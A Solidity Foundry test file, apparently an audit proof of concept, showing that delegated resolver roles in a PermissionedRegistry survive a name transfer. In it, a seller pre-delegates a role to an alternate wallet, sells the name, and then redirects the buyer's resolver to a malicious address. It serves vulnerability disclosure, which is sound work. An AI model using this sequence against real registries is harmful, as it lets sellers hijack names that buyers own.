// SPDX-License-Identifier: MIT
pragma solidity >=0.8.13;

// solhint-disable no-console, state-visibility, func-name-mixedcase, one-contract-per-file

import {Test} from "forge-std/Test.sol";

import {
    PermissionedRegistry,
    IRegistry,
    IRegistryMetadata,
    IHCAFactoryBasic,
    RegistryRolesLib,
    LibLabel
} from "~src/registry/PermissionedRegistry.sol";
import {SimpleRegistryMetadata} from "~src/registry/SimpleRegistryMetadata.sol";
import {MockHCAFactoryBasic} from "~test/mocks/MockHCAFactoryBasic.sol";
import {EACBaseRolesLib} from "~src/access-control/libraries/EACBaseRolesLib.sol";

/// @dev PoC: delegated EAC roles survive an ERC1155 name transfer, so a seller (via a
///      pre-delegated alt address) keeps control of a sold name's resolver/subregistry.
///      Mirrors "Key Area of Concern #3 / CVE-2020-5232" from AUDIT_README.md.
contract ResidualAccessPoC is Test {
    PermissionedRegistry registry;
    MockHCAFactoryBasic hcaFactory;
    IRegistryMetadata metadata;

    // Roles the ETHRegistrar grants the owner at registration (see ETHRegistrar.REGISTRATION_ROLE_BITMAP).
    uint256 constant REGISTRATION_ROLE_BITMAP =
        RegistryRolesLib.ROLE_SET_SUBREGISTRY |
            RegistryRolesLib.ROLE_SET_SUBREGISTRY_ADMIN |
            RegistryRolesLib.ROLE_SET_RESOLVER |
            RegistryRolesLib.ROLE_SET_RESOLVER_ADMIN |
            RegistryRolesLib.ROLE_CAN_TRANSFER_ADMIN;

    address alice = makeAddr("alice"); // seller
    address aliceAlt = makeAddr("aliceAlt"); // seller's second wallet
    address carol = makeAddr("carol"); // buyer
    address honestResolver = makeAddr("honestResolver");
    address maliciousResolver = makeAddr("maliciousResolver");

    string label = "premium";
    uint64 expiry = uint64(block.timestamp + 365 days);

    function setUp() public {
        hcaFactory = new MockHCAFactoryBasic();
        metadata = new SimpleRegistryMetadata(hcaFactory);
        // This test contract is the registrar/root admin (ALL_ROLES on root).
        registry = new PermissionedRegistry(
            hcaFactory,
            metadata,
            address(this),
            EACBaseRolesLib.ALL_ROLES
        );
    }

    function test_PoC_delegatedRoleSurvivesSale_sellerHijacksBuyersResolver() external {
        // 1) Alice registers "premium.eth" with the standard registration roles.
        uint256 anyId = registry.register(
            label,
            alice,
            IRegistry(address(0)),
            honestResolver,
            REGISTRATION_ROLE_BITMAP,
            expiry
        );

        // 2) BEFORE selling, Alice delegates ROLE_SET_RESOLVER to her own alt wallet.
        //    She is allowed to because she holds ROLE_SET_RESOLVER_ADMIN.
        vm.prank(alice);
        registry.grantRoles(anyId, RegistryRolesLib.ROLE_SET_RESOLVER, aliceAlt);

        // grant regenerated the token id; fetch the live one.
        uint256 tokenId = registry.getTokenId(anyId);
        assertEq(registry.ownerOf(tokenId), alice, "alice owns before sale");
        assertTrue(
            registry.hasRoles(tokenId, RegistryRolesLib.ROLE_SET_RESOLVER, aliceAlt),
            "alt delegated"
        );

        // 3) Alice sells/transfers the name to Carol.
        vm.prank(alice);
        registry.safeTransferFrom(alice, carol, tokenId, 1, "");

        // Carol is now the sole, rightful owner of the token.
        assertEq(registry.ownerOf(tokenId), carol, "carol owns after sale");
        // Alice (the previous owner) correctly retains no roles herself.
        assertFalse(
            registry.hasRoles(tokenId, RegistryRolesLib.ROLE_SET_RESOLVER, alice),
            "alice lost her own roles (expected)"
        );

        // 4) BUG: the delegated role survived the sale. Alice's alt wallet still controls
        //    the resolver of Carol's name.
        assertTrue(
            registry.hasRoles(tokenId, RegistryRolesLib.ROLE_SET_RESOLVER, aliceAlt),
            "BUG: delegated role survived the transfer"
        );

        // 5) Exploit: the seller hijacks resolution of the name Carol just bought.
        vm.prank(aliceAlt);
        registry.setResolver(tokenId, maliciousResolver);

        assertEq(
            registry.getResolver(label),
            maliciousResolver,
            "BUG: seller redirected the buyer's resolver post-sale"
        );
    }
}
